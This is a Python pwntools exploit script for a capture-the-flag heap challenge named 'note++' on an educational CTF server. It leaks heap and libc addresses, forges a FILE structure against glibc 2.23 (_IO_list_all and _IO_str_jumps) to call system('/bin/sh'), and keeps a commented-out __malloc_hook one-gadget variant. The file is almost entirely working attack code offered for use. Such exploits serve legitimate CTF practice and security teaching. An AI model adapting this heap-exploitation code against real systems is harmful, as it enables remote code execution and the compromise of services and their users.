from pwn import *

context.binary = './note++'
#r = process('./note++')
r = remote('edu-ctf.csie.org', 10181)
elf = ELF('./libc-2.23.so')

def Add(size, data, description):
    r.sendlineafter('> ', '1')
    r.sendlineafter('Size: ', str(size))
    r.sendafter('Note: ', data)
    r.sendlineafter('Description of this note: ', description)

def List():
    r.sendlineafter('> ', '2')

def Delete(index):
    r.sendlineafter('> ', '3')
    r.sendlineafter('Which note do you want to delete?\nIndex: ', str(index))

Add(0x18, 'a', 'a')

Add(0x18, 'a', 'a')
Add(0x78, 'a', 'a')
Add(0x78, 'a', 'a')

Add(0x18, 'a', 'a')
Add(0x18, 'a', 'a')
Add(0x18, 'a', 'a')

Delete(6)
Delete(5)
Delete(4)
Add(0, 'A'*0x20, 'a')
List()
r.recvuntil('Note 4:')
r.recvuntil('A'*0x20)
heap = u64(r.recvn(6).ljust(8, '\x00')) - 0x180
print('heap', hex(heap))


Delete(1)
Add(0, 'A'*0x18 + flat(0x91, 'A'*0x88, 0x71)  , 'a')
Delete(2)
Delete(1)
Add(0, 'A'*0x20, 'a')
List()
r.recvuntil('Note 1:')
r.recvuntil('A'*0x20)
libc = u64(r.recvn(6).ljust(8, '\x00')) - 0x3c4b78
print('libc', hex(libc))

Delete(0)
io_list_all = libc + 0x3c5520
binsh = heap+0x10
context.arch = 'amd64'
system = libc+0x45390
io_str_jumps = libc+0x3c37a0

FILE = flat(0, 0x61,0x0,io_list_all-0x10, 0,1,0, binsh )

Add(0, '/bin/sh\x00' + p64(system)*5 + FILE.ljust(0xd8, '\x00') +p64(io_str_jumps-8) + p64(system)*4+ '/bin/sh\x00' , 'a' ) 
#Add(0, '/bin/sh\x00' + p64(0)*5 + FILE.ljust(0x98,'\x00')+p64(heap+0x100) + flat(0,0,0,1,0,0,heap+0x140,1,2,3,0,system,system,system,system,system) , 'a')



"""
payload = flat(
    'b' * 0x18,
    0x71,
    elf.sym.__malloc_hook - 0x10 - 0x3
)
Delete(6)
Delete(5)
raw_input('#')
Add(0, payload, 'b')
Add(0x68, 'b', 'b')

gadget = [0x45216, 0x4526a, 0xf02a4, 0xf1147, 0xcd0f3, 0xcd1c8, 0xf02b0, 0xf66f0]
for g in range(len(gadget)):
    gadget[g] += elf.address
    success('gadget[{}]: {}'.format(g, hex(gadget[g])))

payload = flat(
    'c' * 0x3,
    elf.address+0x47b40
    #gadget[0]
)
Add(0x68, payload, 'c')

Delete(7)
r.sendlineafter('> ', '1')
r.interactive()
r.sendlineafter('Size: ', str(0))
"""


r.interactive()
